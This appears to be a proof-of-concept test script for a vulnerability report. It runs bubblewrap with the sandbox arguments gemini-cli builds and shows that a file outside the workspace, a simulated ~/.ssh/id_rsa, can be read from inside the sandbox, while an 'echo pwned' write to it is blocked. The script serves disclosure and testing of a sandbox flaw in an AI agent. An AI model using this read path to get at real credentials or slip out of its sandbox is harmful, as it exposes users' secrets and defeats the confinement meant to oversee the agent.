// Actually executes the real `bwrap` binary with the exact, real argument
// list gemini-cli's own buildBwrapArgs() produced, to prove -- by live
// execution, not inference -- that a file outside the sandboxed workspace
// can be read (and, as a control, that writing to that same file is
// correctly blocked).
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';

const argsFile = process.argv[2];
if (!argsFile) {
  console.error('Usage: node run_bwrap_test.mjs <path-to-args.json>');
  process.exit(1);
}
const victimHome = process.env.VICTIM_HOME;
if (!victimHome) {
  console.error('VICTIM_HOME env var not set.');
  process.exit(1);
}
const secretPath = `${victimHome}/.ssh/id_rsa`;
const bwrapArgs = JSON.parse(fs.readFileSync(argsFile, 'utf8'));

console.log(`=== TEST 1: READ ${secretPath} (outside the workspace) from inside the real sandbox ===`);
const readResult = spawnSync('bwrap', [...bwrapArgs, '--', 'cat', secretPath], { encoding: 'utf8' });
console.log('exit code:', readResult.status);
console.log('stdout:', readResult.stdout);
console.log('stderr:', readResult.stderr);

console.log();
console.log(`=== TEST 2 (control): WRITE to ${secretPath} from inside the same sandbox ===`);
const writeResult = spawnSync('bwrap', [...bwrapArgs, '--', 'sh', '-c', `echo pwned > ${secretPath}`], { encoding: 'utf8' });
console.log('exit code:', writeResult.status);
console.log('stdout:', writeResult.stdout);
console.log('stderr:', writeResult.stderr);

console.log();
console.log('=== VERDICT ===');
const readSucceeded = readResult.status === 0 && readResult.stdout.includes('SIMULATED_REAL_SECRET_SSH_KEY');
const fileStillIntact = fs.readFileSync(secretPath, 'utf8').includes('SIMULATED_REAL_SECRET_SSH_KEY');
console.log('Read of file outside workspace SUCCEEDED (contradicts documented confinement):', readSucceeded);
console.log('Write to same file was correctly BLOCKED (file unmodified after write attempt):', fileStillIntact);

if (!readSucceeded) {
  console.error('NOT CONFIRMED -- read did not succeed as expected.');
  process.exit(1);
}
